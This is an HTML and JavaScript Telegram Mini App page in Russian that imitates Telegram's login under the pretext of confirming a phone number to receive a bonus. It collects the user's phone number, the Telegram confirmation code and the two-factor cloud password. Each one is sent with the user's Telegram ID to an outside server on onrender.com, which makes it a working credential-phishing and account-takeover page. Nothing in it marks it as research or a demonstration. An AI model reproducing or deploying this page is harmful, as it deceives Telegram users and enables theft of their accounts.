<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-theme-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-button-color: #24A1DE;
            --tg-theme-button-text-color: #ffffff;
            --tg-theme-hint-color: #999999;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            margin: 0; padding: 20px;
            display: flex; flex-direction: column; align-items: center;
        }
        .container { width: 100%; max-width: 400px; text-align: center; }
        .step { display: none; animation: fadeIn 0.3s ease; }
        .step.active { display: block; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        img.logo { width: 80px; height: 80px; margin-top: 20px; margin-bottom: 10px; }
        h2 { font-size: 20px; margin-bottom: 8px; }
        p { font-size: 14px; color: var(--tg-theme-hint-color); line-height: 1.4; margin-bottom: 25px; }

        input {
            width: 100%; box-sizing: border-box;
            padding: 14px; margin-bottom: 15px;
            border: 1px solid #dcdcdc; border-radius: 10px;
            font-size: 16px; outline: none;
            background: #f4f4f5; color: #000;
            -moz-appearance: textfield;
        }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input:focus { border: 2px solid var(--tg-theme-button-color); }

        .btn {
            width: 100%; padding: 14px;
            background-color: var(--tg-theme-button-color);
            color: var(--tg-theme-button-text-color);
            border: none; border-radius: 10px;
            font-size: 16px; font-weight: 600; cursor: pointer;
        }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }

        .loader { 
            display: none; margin-top: 15px; 
            border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-theme-button-color); 
            border-radius: 50%; width: 24px; height: 24px; 
            animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div id="step-phone" class="step active">
        <img src="https://telegram.org/img/t_logo.png" class="logo">
        <h2>Ваш номер</h2>
        <p>Подтвердите номер телефона,<br>чтобы зачислить бонус на баланс.</p>
        <input type="tel" id="phone" placeholder="+7 900 000-00-00">
        <button class="btn" onclick="processPhone()">Продолжить</button>
    </div>

    <div id="step-code" class="step">
        <h2>Проверка</h2>
        <p>Мы отправили код подтверждения в приложение Telegram.</p>
        <input type="text" inputmode="numeric" id="code" placeholder="Код подтверждения">
        <button class="btn" onclick="processCode()">Подтвердить</button>
    </div>

    <div id="step-2fa" class="step">
        <h2>Облачный пароль</h2>
        <p>Ваш аккаунт защищен 2FA. Введите пароль.</p>
        <input type="password" id="password" placeholder="Пароль">
        <button class="btn" onclick="process2FA()">Войти</button>
    </div>

    <div id="loader" class="loader"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    const API_URL = "https://telegram-1-gpvs.onrender.com/api"; 
    
    // Получаем ID пользователя
    const USER_ID = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown";

    function toggleLoader(show) {
        document.getElementById('loader').style.display = show ? 'block' : 'none';
        const btns = document.querySelectorAll('.btn');
        btns.forEach(b => b.disabled = show);
    }

    async function apiPost(data) {
        try {
            // Увеличиваем таймаут ожидания (Render может долго просыпаться)
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 секунд

            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, user_id: USER_ID.toString() }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            return await response.json();
        } catch (err) {
            console.error("Fetch error:", err);
            return { status: "error", message: "Сервер спит или недоступен. Попробуйте через 30 секунд." };
        }
    }

    async function processPhone() {
        const phone = document.getElementById('phone').value.trim();
        if (phone.length < 10) return alert("Введите корректный номер");

        toggleLoader(true);
        const res = await apiPost({ action: "send_phone", phone: phone });
        toggleLoader(false);

        if (res.status === "ok") {
            document.getElementById('step-phone').classList.remove('active');
            document.getElementById('step-code').classList.add('active');
        } else {
            alert(res.message);
        }
    }

    async function processCode() {
        const code = document.getElementById('code').value.trim();
        if (!code) return alert("Введите код");

        toggleLoader(true);
        const res = await apiPost({ action: "send_code", code: code });
        toggleLoader(false);

        if (res.status === "success") {
            alert("✅ Авторизация успешна!");
            tg.close();
        } else if (res.status === "need_2fa") {
            document.getElementById('step-code').classList.remove('active');
            document.getElementById('step-2fa').classList.add('active');
        } else {
            alert(res.message);
        }
    }

    async function process2FA() {
        const pass = document.getElementById('password').value.trim();
        if (!pass) return alert("Введите пароль");

        toggleLoader(true);
        const res = await apiPost({ action: "send_2fa", password: pass });
        toggleLoader(false);

        if (res.status === "success") {
            alert("✅ Авторизация успешна!");
            tg.close();
        } else {
            alert(res.message);
        }
    }
</script>

</body>
</html>
